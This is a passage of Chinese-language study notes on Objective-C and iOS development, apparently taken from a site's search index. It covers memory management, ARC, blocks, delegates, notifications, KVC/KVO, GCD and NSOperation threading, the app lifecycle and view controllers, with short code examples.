显示（显示一个对象的引用计数）：retainCount。  为什么要引入 autorelease？\n  在初始化一个对象的时候自动指明，如果对象的引用计数降为 0，则自动释放这个对象。\n  比如在未使用 autorelease 的时候一个代码可能是这么写的：\n- (People *)createPeople { People *people = [[People alloc] init]; people.name = @\u0026#34;小王\u0026#34;; people.age = 10; people.male = YES; return people; } - (void)func2 { People *people = [self createPeople]; [people trainingDog]; [people release]; }    如果使用了这个关键字，则代码会被写成这样：\n- (People *)createPeople { People *people = [[[People alloc] init] autorelease]; people.name = @\u0026#34;小王\u0026#34;; people.age = 10; people.male = YES; return people; } - (void)func2 { People *people = [self createPeople]; [people trainingDog]; }   什么是 AutoReleasePool？\n  线程在一个 Autorelease Pool 的上下文中执行，线程任务完成后销毁，主线程不会销毁；\n  在一次事件循环结束后，Autorelease Pool 中声明的变量会被自动释放；\n  如果在这个线程中定义了大量的变量，在释放变量时则会导致短时间的内存占用过高。比如下面的代码：\nfor (int i = 0; i \u0026lt; 100; i++) { NSString *fileContents = [NSString stringWithContentsOfURL:urlArray[i] encoding:NSUnicodeStringEncoding error:nil]; NSLog(@\u0026#34;%@\u0026#34;, fileContents); } 使用 AutoReleasePool 则可以写成下面的形式：\nfor (int i = 0; i \u0026lt; 100; i++) { NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init]; NSString *fileContents = [NSString stringWithContentsOfURL:urlArray[i] encoding:NSUnicodeStringEncoding error:nil]; NSLog(@\u0026#34;%@\u0026#34;, fileContents); [pool release]; } 也可以用比较语法糖的写法：\nfor (int i = 0; i \u0026lt; 100; i++) { @autoreleasepool { NSString *fileContents = [NSString stringWithContentsOfURL:urlArray[i] encoding:NSUnicodeStringEncoding error:nil]; NSLog(@\u0026#34;%@\u0026#34;, fileContents); } }   如何解决循环引用？\n  循环引用指两个对象相互持有，导致无法被释放的状态。比如：\n@interface People : NSObjec @property(nonatomic, retain) Dog *dog; @end @interface Dog : NSObject @property(nonatomic, retain) People *owner; @end   解决循环引用，只需要将其中一个持有改为赋值即可：\n@interface People : NSObjec @property(nonatomic, retain) Dog *dog; @end @interface Dog : NSObject @property(nonatomic, assign) People *owner; @end   ARC #  系统会检测出何时需要保持对象，何时需要自动释放对象，何时需要释放对象，编译器会管理好对象的内存，会在何时的地方插入 retain, release 和 autorelease，通过生成正确的代码去自动释放或者保持对象。\n相比于 MRC，ARC 使用的是以下的几个关键词：\n 生成仍然保留 alloc、new、cpoy； 持有使用关键词 strong（相对于 MRC 中的关键词 retain）； 不持有则使用关键词 weak（相对于 MRC 中的关键词 assign，区别），当对象没有被强持有时置为 nil； 释放保留了之前的两个关键词，引入了新的关键词 dealloc，它的好处是无需要释放父类；  两种拷贝协议：\n  NSCopying：调用 copy 方法，需要实现 NSCopying 协议，否则 Crash。比如下面的调用：\n@class People; @interface Dog : NSObject \u0026lt;NSCopying\u0026gt; @property(nonatomic, strong) NSString *name; @property(nonatomic, assign) NSInteger weight; @property(nonatomic, weak) People *owner; @end @implementation Dog - (id)copyWithZone:(nullable NSZone *)zone { Dog *dog = [[Dog alloc] init]; dog.name = self.name; dog.weight = self.weight; dog.owner = self.owner; return dog; } @end   NSMutableCopying：字符串、数组、字典等对象，需要进行深拷贝对象，需要实现 NSMutableCopying。比如下面的调用：\n@class People; @interface Dog : NSObject \u0026lt;NSMutableCopying\u0026gt; @property(nonatomic, strong) NSString *name; @property(nonatomic, assign) NSInteger weight; @property(nonatomic, weak) People *owner; @end @implementation Dog - (id)mutableCopyWithZone:(nullable NSZone *)zone { Dog *dog = [[Dog alloc] init]; dog.name = self.name; dog.weight = self.weight; dog.owner = self.owner; return dog; } @end 这个协议的实现可以设计成 不可变与可变 两种形式，其区别就在于外界是否可以对对象进行修改（我感觉就类似于 c++ 中的引用与常量引用）。\n  "},{"id":274,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/4.%E5%9D%97/","title":"4.块","section":"Objective-C\u0026SDK","content":"块 #  概念 #  什么是 Blocks？\n Blocks 是对 C 语言的扩展，也就是带有局部变量的匿名函数； 它的好处是是使得 Objective-C 可以像 JavaScript 一样进行函数式编程；  Blocks 的一些特点：\n 块可接受参数，也可返回值。 块可以分配在栈或堆上，也可以是全局的，分配在栈上的块可拷贝到堆里。 和标准的 Objective-C 对象一样，具备引用计数了。  定义块 #  定义一个块对象基础的语法是：\n^{ // Block implementation here };  很显然这是一个匿名函数，就像 JavaScript 一样，也可以像下面一样直接执行：\n^{ // Block implementation here }(); 但是通常我们定义一个 Blocks 时，通常是需要一个名字的：\nvoid (^someBlock)() = ^{ // Block implementation here }; 这样定义的块可以通过像 C 中的语法一样调用：someBlock()\n常见问题 #  块的强大之处是：\n  在声明它的范围里。所有变量都可以为其所捕获。这也就是说，那个范围里的全部变量，在块里依然可用。\n  比如，下面这段代码所定义的块，就使用了块以外的变量：\nint additional = 5; int (^addBlock)(int a, int b) = ^(int a, int b){ return a + b + addItional; }; int add = addBlock(2, 5); // \u0026lt; add = 12   我们也可以为常用的块创建 typedef：\ntypedef void (^CompletionHandler)(void); typedef int (^ComputeHandler)(int a, id b, NSObject *c); typedef NSObject * (^ComputeHandler)(int a, id b, NSObject *c); 但是 blocks 一般是不可以主动修改局部变量的，需要修改的话则需要添加 __block 关键字：\n- (void)changeValue { __block int value = 0; void (^someBlock)(void) = ^{ NSLog(@\u0026#34;value:%i\u0026#34;, value); // value:1  value = 2; }; value = 1; someBlock(); NSLog(@\u0026#34;value:%i\u0026#34;, value); // value:2 } 循环引用：\n  因为块也是一个对象，如果你在块的代码引用了 self 这个变量，则会导致循环引用。比如：\n@interface ViewController () @property (nonatomic, copy) NSString *name; @property (nonatomic, strong) CompletionHandler handler; @end @implementation ViewController - (void)blocks { self.handler = ^{ NSLog(@\u0026#34;%@\u0026#34;, self.name); }; } @end 这样的循环引用的代码，是会被 xcode 检测出来的。\n  我们可以声明一个 __weak 的局部变量解决这个问题：\n@interface ViewController () @property (nonatomic, copy) NSString *name; @property (nonatomic, strong) CompletionHandler handler; @end @implementation ViewController - (void)blocks { __weak __typeof(self)weakSelf = self; self.handler = ^{ __strong __typeof(weakSelf)strongSelf = weakSelf; NSLog(@\u0026#34;%@\u0026#34;, strongSelf.name); }; } @end   在 Objective-C 中，NSArray 提供了一个传入块依次执行的函数，其名为 enumerateObjectsUsingBlock。比如下面是一个遍历数组的示例代码：\nNSArray *array = @[@0, @1, @2, @3, @4, @5]; __block NSInteger count = 0; [array enumerateObjectsUsingBlock:^(NSNumber *number, NSUInteger idx, BooL *stop) { if([number compare:@2] == NSOrderedAscending) { count++; } }] ; "},{"id":275,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/5.%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/","title":"5.通信方式","section":"Objective-C\u0026SDK","content":"通信方式 #  Delegate #  delegate 是委托模式，委托模式是将一件属于委托者做的事情，交给另外一个被委托者来处理。\n一个标准的委托由以下的部分组成：\n@protocol FeederDelegate \u0026lt;NSObject\u0026gt; - (void)feed; @end @interface People : NSObject\u0026lt;FeederDelegate\u0026gt; @end @interface Dog : NSObject @property(nonatomic, weak) id\u0026lt;FeederDelegate\u0026gt; delegate; @end 也就是说，People 是一个必须要满足 Feeder 这个协议的模型，那么它必须实现一个 feed 函数。在 Dog 这个对象创建的时候可以将其 delegate 成员：\n- (People *)createPeople { People *people = [[People alloc] init]; Dog *dog = [[Dog alloc] init]; dog.delegate = people;\t// 赋值 delegate 属性  people.dog = dog; return people; } 比如我们需要捕获对于一个按钮相应的动作事件，我们可以通过下面的两步完成：\n  在创建 Button 时，将 UIControlEventTouchUpInside 这个对象绑定一个名为 buttonHandler 的函数：\n- (void)createButton { UIButton *button = [[UIButton alloc] init]; [button addTarget:self action:@selector(buttonHandler:) forControlEvents:UIControlEventTouchUpInside]; }   然后 buttonHandler 则可以在我们自己的类中实现：\n- (void)buttonHandler:(UIButton *)button { // 点击按钮 }   Block #  可以通过 typedef 定义一个 Block 类型，然后类似地实现。比如下面是定义和实现：\ntypedef void (^FeedHandler)(void); @class People; @interface Dog : NSObject @property (nonatomic, copy) FeedHandler handler; @end @implementation Dog - (void)hungry { if (self.handler != nil) { self.handler(); } } @end 然后可以用下面的方式给 Dog 的 handler 赋值：\n@implementation People - (void)setDog:(Dog *)dog { if (_dog != dog) { // 判断不同的dog  _dog = dog; __weak __typeof(self)weakSelf = self; _dog.handler = ^{ __strong __typeof(weakSelf)strongSelf = weakSelf; [strongSelf cook]; [strongSelf feedPet]; [strongSelf clear]; }; } } @end NSNotification #  大部分情况下，前两者实现方式能解决大部分问题，但是有一些情况是无法解决的，比如：\n 一对多。依赖关键远（比如两个页面间的通信）  于是需要用到 NSNotification 这样一个通知系统，这个通知系统的使用主要有以下三步：\n  添加通知：\n[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(notificationFirst:) name:@\u0026#34;people.name\u0026#34; object:nil];   上面的 notificationFirst 就是一个类自己实现的回调方法：\n- (void)notificationFirst:(NSNotification *)notification { NSLog(@\u0026#34;people.name：%@\u0026#34;, notification.object); // people.name：小王 }   在其他地方发送通知，则这个类则会收到相应：\n[[NSNotificationCenter defaultCenter] postNotificationName:@\u0026#34;people.name\u0026#34; object:@\u0026#34;小王\u0026#34;];   KVC \u0026amp;\u0026amp; KVO #  什么是 KVC？\n  KVC：Key-Value Coding，即键值编码。\n  它是一种不通过存取方法，而通过属性名称字符串间接访问属性的机制。\n  取值和赋值实现了下面的两个函数：\n-(void)setValue:(nullable id)value forKey:(NSString *)key; -(nullable id)valueForKey:(NSString *)key;   除此之外，KVC 也提供了传入路径进行访问的方法：\n  -(nullable id)valueForKeyPath:(NSString *)keyPath; -(void)setValue:(nullable id)value forKeyPath:(NSString *)keyPath; 比如传入 student.name，就表示 student 属性里的 name 属性\n  什么是 KVO？\n Key-Value Obersver，即键值观察。它是观察者模式的一种衍生。 基本思想是，对目标对象的某属性添加观察，当该属性发生变化时，会自动的通知观察者。这里所谓的通知是触发观察者对象实现的 KVO 的接口方法。  下面讲一个 KVO 的例子：\n  首先给目标对象的属性添加观察，下面是这个方法的原型：\n- (void)addObserver:(NSObject *)observer forKeyPath:(NSString *)keyPath options:(NSKeyValueObservingOptions)options context:(nullable void *)context; 其中，NSKeyValueObservingOptions 是一个枚举常量：\nNSKeyValueObservingOptions: NSKeyValueObservingOptionNew // 提供更改前的值 \tNSKeyValueObservingOptionOld // 提供更改后的值 \tNSKeyValueObservingOptionInitial // 观察最初的值（在注册观察服务时会调用一次触发方法） \tNSKeyValueObservingOptionPrior // 分别在值修改前后触发方法（即一次修改有两次触发）   实现下面方法来接收通知，需要注意各个参数的含义：\n- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary\u0026lt;NSString *,id\u0026gt; *)change context:(void *)context   最后要移除观察者：\n- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary\u0026lt;NSString *,id\u0026gt; *)change context:(void *)context   "},{"id":276,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/6.%E5%A4%9A%E7%BA%BF%E7%A8%8B/","title":"6.多线程","section":"Objective-C\u0026SDK","content":"多线程 #  iOS 线程概述 #  主线程：\n iOS App 运行后，默认会开启 1 条线程，称为“主线程”或“UI线程” 主线程处理 UI 事件（比如点、滑动、拖拽等等）和显示、刷新 UI 界面  iOS 的线程相关技术主要有以下四种：\n   技术方案 特点 语言 线程生命周期     pthread 一套通用的多线程 API\n适用于 Unix/Linux/Windows 系统\n跨平台、可移植、使用难度大 C 程序员管理   NSThread 使用面向对象编程\n简单易用，可以直接操作线程对象 Objective-C 程序员管理   GCD 旨在替代前面两种的线程技术\n充分利用设备的多核特性 C 自动管理   NSOperation 基于 GCD，加入一些简单实用的功能\n内容更加面向对象 Objective-C 自动管理    多线程的优缺点：\n 优点是很显然的：能适当提升程序的执行效率；能适当提升资源利用率（CPU、内存等） 缺点：  创建线程是有开销的，比如 iOS 的开销主要有（内核数据结构大约 1KB，栈空间，创建时间 90ms） 如果开启大量的线程，会降低程序的性能、增加 CPU 在线程调度上的开销、程序设计更加复杂。    NSThread #  什么是 NSThread？\n NSThread 是经过 Apple 封装的面向对象的，它允许开发者直接以面向对象的思想对线程进行操作。每一个 NSThread 对象就代表一条线程，但是开发者必须手动管理线程的生命周期，这点是 Apple 不提倡的。  下面是一个利用这个类的实例：\nNSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(run) object:nil]; [thread start]; 这个类常见的方法如下所示：\n[NSThread mainThread];\t// 获取主线程 [NSThread currentThread]; // 获取当前线程 [NSThread exit]; // 退出线程 [thread cancel]; // 取消线程 [NSThread isMainThread]; // 判断是否为多线程 创建一个新的多线程还有其他的创建方式：\n[NSThread detachNewThreadSelector:@selector(run) toTarget:self withObject:nil]; [self performSelectorInBackground:@selector(run) withObject:nil]; GCD \u0026amp;\u0026amp; NSOperation #  GCD #  GCD：Grand Central Dispatch。\n 它可用于多核的并行运算，自动利用更多的 CPU 内核，自动管理的线程生命周期。  同步执行与异步执行：\n  同步：同步添加任务到指定的队列中，在添加的任务执行结束之前，会一直等待，直到队列里面的任务完成之后再继续执行。只能在当前线程中执行任务，不具备开启新线程的能力。\n下面是一个使用同步执行任务的例子：\ndispatch_queue_t queue = dispatch_get_main_queue(); dispatch_sync(queue, ^{ // 想执行的任务 });   异步：异步添加任务到指定的队列中，它不会做任何等待，可以继续执行任务。可以在新的线程中执行任务，具备开启新线程的能力。\n下面是一个使用异步执行任务的例子：\ndispatch_queue_t queue = dispatch_get_main_queue(); dispatch_async(queue, ^{ // 想执行的任务 });   Dispatch Queue 是执行处理的等待队列。主要有以下两种：\n  Serial Queue：串行队列，也称为私有调度队列。按顺序将其中一个任务添加到队列中，并且一次只执行一个任务。一个串行队列使用一个线程。\n下面是生成一个串行队列，并且使用的示例代码：\ndispatch_queue_t queue = dispatch_queue_create(\u0026#34;MySerialDiapatchQueue\u0026#34;, DISPATCH_QUEUE_SERIAL); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread1\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread2\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread3\u0026#34;); });   Concurrent Queue：并行队列，也称为全局调度队列。同时执行一个或多个任务，但任务仍然按照它们添加到队列的顺序执行。\n下面是生成一个并行队列，并且使用的示例代码：\ndispatch_queue_t queue = dispatch_queue_create(\u0026#34;MyConcurrentDiapatchQueue\u0026#34;, DISPATCH_QUEUE_CONCURRENT); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread1\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread2\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread3\u0026#34;); });   另外，系统为每个应用程序提供了一个主调度队列和四个并发调度队列。这些队列对应用程序而言是全局的，而且只对它们的优先级进行区分。我们不需要创建它们，可以用 dispatch_get_global_queue 函数的获取其中一个队列：\n  Main Dispatch Queue：主调度队列，是一种串行队列。通过下面的方式获取：\ndispatch_queue_t mainDiapatchQueue = dispatch_get_main_queue();   Global Dispatch Queue：全局并发队列，是四个并行队列。系统为它们四个划分了优先级顺序，分别是 高 High Priority、默认 Default Priority、低 Low Priotity、后台 Background Priority。\n下面是四段获取这些队列的代码：\ndispatch_queue_t globalDiapatchQueueHigh = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0); dispatch_queue_t globalDiapatchQueueDefault = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0); dispatch_queue_t globalDiapatchQueueLow = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0); dispatch_queue_t globalDiapatchQueueBackground = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0);   另外，处理 GCD 也有一些常见的函数和概念：\n  dispatch_after：指定一个时间，在延迟给定的时间过后，将任务添加到任务队列中执行（可能因为主线程本身的处理有延迟，导致时间不准确）。\n下面是一个使用这个函数的例子：\n/** * dispatch_time: 获取 dispatch_time_t 类型的时间 * DISPATCH_TIME_NOW: 当前时间 * NSEC_PER_SEC: 单位秒 */ dispatch_time_t time = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)); dispatch_after(time, dispatch_get_main_queue(), ^{ NSLog(@\u0026#34;wait at least three second\u0026#34;); });   dispatch group：可以将数个异步多线程任务 组合成一个调度组，通过 dispatch_group_create 函数创建，通过 dispatch_group_async 函数添加任务。组中的所有异步任务执行结束之后，发出统一的通知，使用 dispatch_group_notify 捕获。\n比如下面是一个使用这些函数的例子：\ndispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0); dispatch_group_t group = dispatch_group_create(); dispatch_group_async(group, queue, ^{ NSLog(@\u0026#34;下载图片A\u0026#34;); }); dispatch_group_async(group, queue, ^{ NSLog(@\u0026#34;下载图片B\u0026#34;); }); dispatch_group_async(group, queue, ^{ NSLog(@\u0026#34;下载图片C\u0026#34;); }); dispatch_group_notify(group, dispatch_get_main_queue(), ^{ NSLog(@\u0026#34;处理下载完成的图片\u0026#34;); }); 另外也可以调用 dispatch_group_enter 函数，从而将之后创建的所有的任务都加入对应的调度组。也可以在任务代码中调用 dispatch_group_leave，使当前的任务离开对应的调度组。\n比如下面是一个使用这两个函数的例子：\ndispatch_group_t group = dispatch_group_create(); dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0); dispatch_group_enter(group); dispatch_async(queue, ^{ NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{ NSLog(@\u0026#34;group 1\u0026#34;); dispatch_group_leave(group); }]; [op start]; }); dispatch_group_enter(group); dispatch_async(queue, ^{ NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{ NSLog(@\u0026#34;group 2\u0026#34;); dispatch_group_leave(group); }]; [op start]; }); dispatch_group_notify(group, dispatch_get_main_queue(), ^{ NSLog(@\u0026#34;group end\u0026#34;); });   dispatch_barrier_async 函数用于将一个任务添加到并发执行的任务队列中，通过这种方式添加到队列中的任务：\n 需要等待前面的所有并发任务执行完成后才开始执行； 在这个任务执行时，该并发队列中不能有其他任务执行； 所有排列在该任务之后的任务，需在这个任务执行完成之后执行。  也就是说，它大概是通过下面这个图片的方式执行的：\n  NSOperation #  NSOperation、NSOperationQueue 是基于 GCD 更高一层的封装，完全面向对象。下面介绍一下与这个类相关的一些方法：\n任务的创建过程：\n  使用 NSOperation 的子类 NSInvocationOperation、NSBlockOperation。\n  下面是一个使用 NSInvocationOperation 创建任务的例子：\n- (void)task1 { for (int i = 0; i \u0026lt; 2; i++) { [NSThread sleepForTimeInterval:2]; // 模拟耗时操作  NSLog(@\u0026#34;1---%@\u0026#34;, [NSThread currentThread]); // 打印当前线程  } } - (void)useInvocationOperation { // 1.创建 NSInvocationOperation 对象  NSInvocationOperation *op = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(task1) object:nil]; // 2.调用 start 方法开始执行操作  [op start]; }   下面则是一个使用 NSBlockOperation 创建任务的例子：\n- (void)useBlockOperation { // 1.创建 NSBlockOperation 对象  NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{ for (int i = 0; i \u0026lt; 2; i++) { [NSThread sleepForTimeInterval:2]; // 模拟耗时操作  NSLog(@\u0026#34;1---%@\u0026#34;, [NSThread currentThread]); // 打印当前线程  } }]; // 2.调用 start 方法开始执行操作  [op start]; } 另外在执行 start 之前，可以通过调用 addExecutionBlock 函数，向 Operation 中添加新的任务。\n  队列的创建过程：\n  NSOperationQueue 是任务的队列。可以通过下面的方法获得这样的队列：\n// 获取主队列 NSOperationQueue *queue = [NSOperationQueue mainQueue]; // 创建一个自定义队列 NSOperationQueue *queue = [[NSOperationQueue alloc] init];   NSOperationQueue 有一个函数名称为 addOperation，即将任务添加到队列中。下面是一个用例：\n- (void)addOperationToQueue { // 1.创建队列  NSOperationQueue *queue = [[NSOperationQueue alloc] init]; // 2.创建操作  // 使用 NSInvocationOperation 创建操作1  NSInvocationOperation *op1 = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(task1) object:nil]; // 使用 NSInvocationOperation 创建操作2  NSInvocationOperation *op2 = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(task2) object:nil]; // 使用 NSBlockOperation 创建操作3  NSBlockOperation *op3 = [NSBlockOperation blockOperationWithBlock:^{ for (int i = 0; i \u0026lt; 2; i++) { [NSThread sleepForTimeInterval:2]; // 模拟耗时操作  NSLog(@\u0026#34;3---%@\u0026#34;, [NSThread currentThread]); // 打印当前线程  } }]; [op3 addExecutionBlock:^{ for (int i = 0; i \u0026lt; 2; i++) { [NSThread sleepForTimeInterval:2]; // 模拟耗时操作  NSLog(@\u0026#34;4---%@\u0026#34;, [NSThread currentThread]); // 打印当前线程  } }]; // 3.使用 addOperation: 添加所有操作到队列中  [queue addOperation:op1]; // [op1 start]  [queue addOperation:op2]; // [op2 start]  [queue addOperation:op3]; // [op3 start] }   设置属性 maxConcurrentOperationCount 可以控制队列中的最大并发数；\n  调用函数 addDependency 可以设置队列中任务执行的依赖顺序。比如希望 op2 一定在 op1 之后执行：\n[op2 addDependency:op1];   NSOperation 也存在任务之间的优先级的关系，它们是通过枚举常量定义的：\ntypedef NS_ENUM(NSInteger, NSOperationQueuePriority) { NSOperationQueuePriorityVeryLow = -8L, NSOperationQueuePriorityLow = -4L, NSOperationQueuePriorityNormal = 0, NSOperationQueuePriorityHigh = 4, NSOperationQueuePriorityVeryHigh = 8 }; "},{"id":277,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/7.%E7%AE%80%E5%8D%95ui/","title":"7.简单 Ui","section":"Objective-C\u0026SDK","content":"简单 UI #  iOS App #   官方文档：\n https://developer.apple.com/documentation/uikit/app_and_environment/managing_your_app_s_life_cycle  一个参考了一个有趣的博客：\n https://medium.com/@theiOSzone/briefly-about-the-ios-application-lifecycle-92f0c830b754   一个 iOS 的声明周期中会有以下的五种状态，下图列举官网中对这五种状态之间切换的示例：\n这些声明周期的转换中也有一些相关的 HOOK 函数，那下图这个流程中的编号举例子：\n  这个变换流程中，有两个声明周期函数：\n willFinishLaunchingWithOptions：如果你的程序启动成功的话，这个是整个应用第一次执行的代码； didFinishLaunchingWithOptions：在屏幕上即将显示任何画面之前执行的函数；    在程序进入 Active 状态之后，会执行：applicationDidBecomeActive；\n  applicationWillResignActive：当用户点击了 Home 键或者启动了其他应用程序之后，会执行这个函数；与此同时，系统还会发出一个信号 UIApplicationWillResignActiveNotification。\n  applicationDidEnterBackground：在上面的一个流程之后，程序会从 Inactive 状态进入 Background 状态，同时触发这个 hook 函数；\n  applicationWIllEnterForeground：如果应用程序在被操作系统杀死之前，再次被打开进入 Foregound，则会触发这个 hook 函数；\n  Backgound -\u0026gt; Suspended；\n  Suspended -\u0026gt; Backgound；\n如果应用进入后台后 5s 不执行任何计算任务，操作系统则会把它置为暂停状态；相反则会回到后台状态。那是这两个状态之间的切换对程序员是透明的，也就是说无法 HOOK 到这两个状态的切换。\n  applicationWillTerminate：如果应用程序在后台时，就被操作系统杀死了，则会触发这个函数；\n  "},{"id":278,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/8.%E5%A4%8D%E6%9D%82ui/","title":"8.复杂 Ui","section":"Objective-C\u0026SDK","content":" 参考：\n https://developer.apple.com/documentation/uikit/view_controllers?language=objc https://medium.com/@felicity.johnson.mail/pushing-popping-dismissing-viewcontrollers-a30e98731df5   复杂 UI \u0026amp;\u0026amp; 多视图 #  MVC 设计模式 #  MVC 是一种设计模式。我们创建的对象根据其职责来划分，它要么属于 M:Model，要么属于 V:View，要么属于C:Controller，下面我们分别简要介绍一下 Model、View、ViewController。\nModel #  Model 一般是我们对真实世界中一些事物的抽象，来定义的一些数据对象，它包含我们所需要的数据以及对这些数据的操作。\nModel 一般是负责定义及存储数据，是与用户界面上用于显示的各个视觉元素是无关的。\nView #  接下来是 View，在 iOS 中，View 一般是 UIKit 中 UIView 及其子类的一些实例，是用户可以看得见的对象。比如说 UIView，是用于界面元素展示的类的基类，以及 UIButton、UILabel、UISlider、UITextField 等等。\nViewController #  Objective-C 一般是 ViewController 一般是 UIViewController 及其子类的实例，系统提供给我们的比较常用的 ViewController 有以下的这些：\n UIViewController：用来展示多个视图控制器； UITabBarController：在 UIViewController 的特性之上，加入可以在这些控制器之间进行切换； UINavigationController：在 UIViewController 的特性之上，在视图控制器间进行导航控制； UITableViewController：展示一个单列的表的视图控制器； UICollectionViewController：以及展示集合视图的； UIAlertViewController：展示弹框消息。  在项目中，ViewController 可以通过持有的方式直接与 View 与 Model 进行通信。\nViewController 的职责是什么？\n  视图管理：视图控制器最重要的作用是管理视图的层次结构。\n每个视图控制器都有一个根视图，就是 UIViewController 的 view 属性，它包含所有视图控制器的显示内容。在该根视图中，您可以添加显示内容所需的视图。视图控制器始终具有对其根视图的引用，并且根视图视图都具有对其子视图的强引用。\n  充当 View 及 Model 的媒介：两者通过 ViewController 进行通信。\n  处理用户的交互：通常来说视图将用户的交互事件传递给自己的代理对象来进行事件的处理，这个代理对象通常就是 ViewController。\n  资源管理：视图控制器负责管理由其创建的对象。\n在 UIViewController 子类中，是我们开发者负责管理显式创建的任何对象。由于移动设备的内存是有限的，当设备的可用内存不足时，UIKit 会要求应用程序释放他们不再需要的任何资源。\n  这样做的一种方法是调用视图控制器的 didReceiveMemoryWarning 方法：在这个方法里删除对不再需要的对象，或者稍后可以轻松地重新创建的对象的引用。\n  例如，您可以使用该方法删除缓存的数据。在发生内存不足的情况时，尽可能多地释放内存是非常重要。消耗过多内存的应用程序可能会被系统彻底终止以恢复内存。\n    OC 中的内容 VC 种类 #  UIScrollView #  这是一个比较重要的类，UITableView, UICollectionView, UITextView 这些视图都是继承自它。在 iOS 中，滚动视图 UIScrollView 通常用于查看大于屏幕的内容。\n两个比较重要的属性：\n frame：这个属性控制了 UIScrollView 的位置以及大小；可以理解为窗口的大小； ContentSize：定义了 UIScrollView 能显示的内容区域的大小；可以理解为图片的大小；  很显然，如果将 frame 的宽度或者高度设置为最大，就可以实现拖动和分页了。但是如何让它恰好停止在下一个视图呢，只需要设置下面的属性：\nscrollView.pagingEnable = YES; UITableView #  UIScrollView 的子类，可以通过 initWithFrame 创建：\n- (instancetype)initWithFrame:(CGRect)frame style:(UITableViewStyle)style NS_DESIGNATED_INITIALIZER; // must specify style at creation. // - initWithFrame: calls this with UITableViewStylePlain 在创建时必须指定一个创建风格，有以下两个选项：\n UITableViewStylePlain：通讯录类似风格； UITableViewStyleGrouped：系统设置类似风格。  UITableView 主要是以下的几个部分组成：\n+---------------+ \u0026gt;+-----------------------+ | | -/ | | | header view | / | section header view | | | -/ | | ----------------- / ------------------------- | section 1 | / | cell 1 | ----------------- -/ ------------------------- | ... | / | ... | | ... |-/ | ... | ----------------/ ------------------------- | section 2 | | cell 2 | -----------------\\ ------------------------- | section 3 | -\\ | cell 3 | ----------------- -\\ ------------------------- | | -\\ | | | footer view | -\\ | section footer view | | | -\\ | | +---------------+ -\u0026gt;+-----------------------+ 如何创建 UITableView 的子视图？\n  对于 UITableView，我们一般不通过创建子视图并添加其为 UITableView 的子视图来展示内容；\n  一般把这个工作交给一个遵守 UITableViewDataSource 协议的对象：\n@optional - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView; // 用于指定一个 TableView 中有多少个 Section。可选方法，默认返回为 1  - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section; // 这个方法告诉 UITableView 第几个 section 要显示多少行内容  - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath; // 在指定的 indexPath 上具体的要展示的 Cell 长什么样子   PostScript：上面的第三个方法，引入了 NSIndexPath 这个类型，他用于指定一个 Cell 的位置。我们可以使用以下的类方法直接创建这个对象：\n+ (instancetype)indexPathForRow:(NSInteger)row inSection:(NSInteger)section; + (instancetype)indexPathForItem:(NSInteger)item inSection:(NSInteger)section NS_AVAILABLE_IOS(6_0);   UITableViewCell #  上面 UITableViewDataSource 协议的第三个方法指定了 UITableViewCell 这个对象，顾名思义，他就是用来指定 cell 样式的一个类。\n这个对象有一个名为 contentView 的子视图，它有三个子视图。关于这三种视图有以下的四种排列模式：\nOC 中的容器 VC 种类 #  UINavigationController #  ViewController 的栈操作包括 Pushing、Poping，其他的展现方式还包括 Presenting、Dissmissing；\n注意以下的几点：\n  所有通过 prensent 方式展现的 ViewController 都需要主动调用 dismiss；\n  使用 push 方法展现 ViewController 需要通过调用 pop 方法进行消失展示；\n  push 以及 pop 方法只可以在 UINavigationController 上被调用（其他的只能调用 present）；\n  当调用一个 ViewController 的 dismiss 方法时，所有通过该 vc present 出来的 vc 都会被销毁，同时只有最顶部的 ViewController 会展现动画。\nswift 为 UIViewController 定义了一个属性 presentingViewController.dissmiss 用于执行这一操作；\n  同时 Apple 也提供了一个 API，用于仅仅销毁当前 vc，presentedViewController.dismiss；\n  presentedViewController 与 presentingViewController：\n UIViewController 的两个属性，默认值为 nil； 当 vcA 通过  presentViewController:animated:completion: 方法展现 vcB 时：  vcB.presentingViewController 会被置为 vcA； vcA.presentedViewController 会被置为 vcB；    UITabBarController #  iOS 官方 App 